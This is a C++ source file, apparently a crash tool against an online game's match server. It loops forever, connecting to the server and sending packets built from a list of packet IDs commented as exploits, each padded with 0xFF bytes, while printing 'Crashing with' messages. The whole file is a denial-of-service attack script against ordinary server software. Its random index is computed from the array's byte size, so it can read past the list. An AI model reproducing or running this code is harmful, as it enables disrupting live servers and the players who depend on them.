// CrashU.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include "Packet.h"

#pragma comment (lib, "WS2_32")
 typedef struct Host
 {
	 char szIP[64];
	 short nPort;
 }*LPHOST;
 
LPHOST GetHostFromLocator()
{
	WSADATA wsaData;
	WSAStartup (MAKEWORD (2,2), &wsaData);
	LPHOST lpHost = new Host();
	int nRecv = 0;
	PCHAR  lpBuffer = new char[4096];
	SOCKET fd = socket (AF_INET, SOCK_DGRAM, 0);
	
	sockaddr_in sockAddr;
	sockAddr.sin_addr.S_un.S_addr = INADDR_ANY;
	sockAddr.sin_port = htons (7900);
	sockAddr.sin_family = AF_INET;

	sockaddr_in serverAddr;
	serverAddr.sin_addr.S_un.S_addr = inet_addr ("127.0.0.1");
	serverAddr.sin_port = htons (8900); //Locator port
	serverAddr.sin_family  = AF_INET;
	int nSize = sizeof(sockaddr);

			strcpy (lpHost->szIP, "127.0.0.1");
			lpHost->nPort = 7777; //Matchserver port
			return lpHost;
}
 int main()
{

	unsigned short packetIDs[] = 
	{
		0x144, 0x145, 0x3F3, 0x3F4, 0x44D, 0x4BD,  0x4D1, 0x5AC, 0x57A, 0x52A, 0x522, 0x4C6, 0x584, 0x585, 0x5B6, 0x5DE, 0x6A5, 0x6A6, 0x6B8, 
		0x6A8, 0x6AA, 0x6b6, 0x70a, 0x70c, 0x178,  0x71E, 0x728, 0x72D, 0x607, 0x610, 0x623, 0x619, 0x61B, 0x770, 0x7E0, 0x7E8, 0x7EA, 0x7EB,
		0x803, 0xC1C, 0x177E, 0x17A3, 0x17A6, 0x1FA, 0x5209, 0x520E, 0x17D8, 0x5217, 0x9C42, 0x1F45, 0x1F43, 0x1F44, 0x723 //Exploits
	};
	SOCKET fd = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in sockAddr;
	PBYTE lpBuffer;
	PCHAR lpTemp = "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"; //Temp Packet
	PBYTE lpKey = new BYTE[32];
	ZeroMemory (lpKey, 32);

	while (true)
	{
		LPHOST lpHost = GetHostFromLocator();
		
		if (lpHost == NULL)
		{
			Sleep (5000);
			continue;
		}
		
		printf ("Connecting to: %s:%i\n", lpHost->szIP, lpHost->nPort);
		fd = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
		sockAddr.sin_addr.S_un.S_addr = inet_addr (lpHost->szIP); 
		sockAddr.sin_family = AF_INET;
		sockAddr.sin_port = htons (lpHost->nPort); 
		
		if (connect (fd, (sockaddr *)&sockAddr, sizeof(sockaddr)) == SOCKET_ERROR)
		{
			continue;
		}

		CPacket* lpPacket = new CPacket (4096,lpKey);
		unsigned short id = packetIDs[rand() % (sizeof(packetIDs)-1)];
		printf ("Crashing with: %X\n", id);
		lpPacket->MakeCommand (id, 0);
		lpPacket->WriteData(lpTemp, 64);
		lpBuffer = lpPacket->FinalizePacket (100);
		send (fd, (PCHAR)lpBuffer, lpPacket->mSize+8, 0);
		printf ("Sent Packet.\n");
		

		closesocket (fd);
		delete lpPacket; 
	}
	
}